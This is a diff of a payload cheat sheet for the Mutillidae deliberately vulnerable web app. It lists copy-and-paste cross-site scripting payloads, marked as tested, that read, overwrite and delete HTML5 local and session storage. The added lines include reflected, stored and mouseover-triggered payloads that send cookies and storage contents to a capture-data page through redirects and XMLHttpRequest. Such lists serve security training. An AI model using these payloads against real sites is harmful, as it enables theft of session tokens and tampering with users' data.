@@ -210,15 +210,15 @@ HTML 5 - Local and session storage - Adding values
 		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}</script>
 	
 	Copy and Paste both scripts (Cross Site Scripting version) - TESTED SUCCESSFULLY
-	
+
 		<script>localStorage.setItem("AccountNumber","123456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}</script>
 
 	Copy and Paste both scripts (DOM injection version) - TESTED SUCCESSFULLY
-	
+
 		<span onmouseover='try{localStorage.setItem("AccountNumber","789456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}'>DANGER: DONT MOUSEOVER</span>
-	
+
 	Copy and Paste both scripts (Firebug console version) - TESTED SUCCESSFULLY
-	
+
 		try{localStorage.setItem("AccountNumber","789456");sessionStorage.setItem("EnterpriseSelfDestructSequence","A1B2C3");sessionStorage.setItem("SessionID","japurhgnalbjdgfaljkfr");sessionStorage.setItem("CurrentlyLoggedInUser","1233456789");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}	
 
 	--------------------------------------------------------------------------------
@@ -238,13 +238,13 @@ HTML 5 - Local and session storage - Altering values
 	Copy and Paste all three scripts (Firebug console version) - TESTED SUCCESSFULLY
 	(first script reads, second script overwrites, thrid script reads again)
 
-		try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by us!"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}
+		try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by Firebug console!"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};console.log(m);}catch(e){alert(e.message);}
 
 	----------------------------------------------------------------------------------------------
 	Over-writing Storage (Possible Session Fixation) - Set or change another users HTML5 values
 	----------------------------------------------------------------------------------------------
 	Example JavaScript
-	
+
 		<script>
 			localStorage.setItem("MessageOfTheDay","Hello World");
 			sessionStorage.setItem("CartSession","ABCDEFG");
@@ -253,7 +253,7 @@ HTML 5 - Local and session storage - Altering values
 	Refelcted (First Order) Cross Site Script - TESTED SUCCESSFULLY
 	Copy and Paste all three cross site scripts (alert box version) 
 	(first script reads, second script overwrites, thrid script reads again):
-	
+
 		<script>try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by a reflected cross site script"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}</script>
 
 	Peristent (Stored, Second Order) Cross Site Script - TESTED SUCCESSFULLY
@@ -268,6 +268,10 @@ HTML 5 - Local and session storage - Altering values
 	(first script reads, second script overwrites, thrid script reads again):
 	
 		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.setItem("MessageOfTheDay","This was set by a DOM injected XSS"); sessionStorage.setItem("CartSession","ABCDEFG");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}'>DANGER: WHATEVER YOU DO, FOR CRYING OUTLOUD PLEEAASSEEEE DONT MOUSEOVER</span>
+
+--------------------------------------------------------------------------------
+HTML 5 - Local and session storage - Deleting values
+--------------------------------------------------------------------------------
 
 	----------------------------------------------------------------------------------------------
 	Deleting Storage - Set or change another users HTML5 values
@@ -299,7 +303,7 @@ HTML 5 - Local and session storage - Altering values
 		<span onmouseover='try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}try{localStorage.removeItem("MessageOfTheDay"); sessionStorage.removeItem("CartSession");}catch(e){alert(e.message);}try{var m = "";var l = window.localStorage;var s = window.sessionStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};for(i=0;i<s.length;i++){var lKey = s.key(i);m += lKey + "=" + s.getItem(lKey) + ";\n";};window.alert(m);}catch(e){alert(e.message);}'>DANGER: WHATEVER YOU DO, FOR CRYING OUTLOUD PLEEAASSEEEE DONT MOUSEOVER</span>
 
 	--------------------------------------------------------------------------------
-	Altering values to HTML5 Storage and re-displaying page - PRO VERSION
+	Deleting values to HTML5 Storage and re-displaying page - PRO VERSION
 	--------------------------------------------------------------------------------
 
 		<script>localStorage.removeItem("MessageOfTheDay"); var node=window.document.getElementById("idSessionStorageTableBody"); while(node.hasChildNodes()){node.removeChild(node.firstChild)}; init();</script>
@@ -341,6 +345,18 @@ HTML 5 - Local and session storage - Stealing values
 		<script>try{var m = "";var l = window.localStorage;for(i=0;i<l.length;i++){var lKey = l.key(i);m += lKey + "=" + l.getItem(lKey) + ";\n";};alert(m);}catch(e){alert(e.message);}</script>
 
 	--------------------------------------------------------------------------------
+	Steal HTML5 storage with redirection: Intermediate
+	--------------------------------------------------------------------------------
+
+	Copy and Paste - Reflected Cross Site Script - TESTED SUCCESSFULLY
+	
+		<script>document.location="http://localhost/mutillidae/capture-data.php?html5storage=" + document.cookie;</script>
+
+	Copy and Paste - Persistent Cross Site Script - TESTED SUCCESSFULLY
+	
+		<script>document.location="http://localhost/mutillidae/capture-data.php?html5storage=" + document.cookie;</script>
+
+	--------------------------------------------------------------------------------
 	Steal HTML5 storage with XHR injection: Professional
 	--------------------------------------------------------------------------------
 	Generic XHR using GET and XMLHttpRequest to steal cookies
@@ -375,9 +391,21 @@ HTML 5 - Local and session storage - Stealing values
 			}catch(e){} 
 		</script>
 
-	Copy and Paste:
+	Copy and Paste
+	Reflected Cross Site Script - TESTED SUCCESSFULLY
+
+		<script>try{ var s = sessionStorage; var l = localStorage; var m = ""; var lXMLHTTP; for(i=0;i<s.length;i++){ m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; "; } for(i=0;i<l.length;i++){ m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; "; } var lAction = "http://localhost/mutillidae/capture-data.php?html5storage=" + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){}</script>
+
+	Copy and Paste
+	Peristent (Stored, Second Order) Cross Site Script - TESTED SUCCESSFULLY
+	NOTE: This version "MySQL escapes" the "\n" new-line character by doubling up the "\" character because "\n" means new-line in MySQL and this is going to be inserted into the database.
 
 		<script>try{ var s = sessionStorage; var l = localStorage; var m = ""; var lXMLHTTP; for(i=0;i<s.length;i++){ m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; "; } for(i=0;i<l.length;i++){ m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; "; } var lAction = "http://localhost/mutillidae/capture-data.php?html5storage=" + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){} </script>
+
+	Copy and Paste
+	DOM injected Cross Site Script - THIS NEEDS WORK - Causes SQL errors
+	
+		<span onmouseover='try{ var s = sessionStorage; var l = localStorage; var m = ""; var lXMLHTTP; for(i=0;i<s.length;i++){ m += "sessionStorage(" + s.key(i) + "):" + s.getItem(s.key(i)) + "; "; } for(i=0;i<l.length;i++){ m += "localStorage(" + l.key(i) + "):" + l.getItem(l.key(i)) + "; "; } var lAction = "http://localhost/mutillidae/capture-data.php?html5storage=" + m; lXMLHTTP = new XMLHttpRequest(); lXMLHTTP.onreadystatechange = function(){}; lXMLHTTP.open("GET", lAction); lXMLHTTP.send(""); }catch(e){}'>DANGER: WHATEVER YOU DO, PLEEAASSEEEE DONT MOUSEOVER</span>
 
 -------------------------
 Command Injection
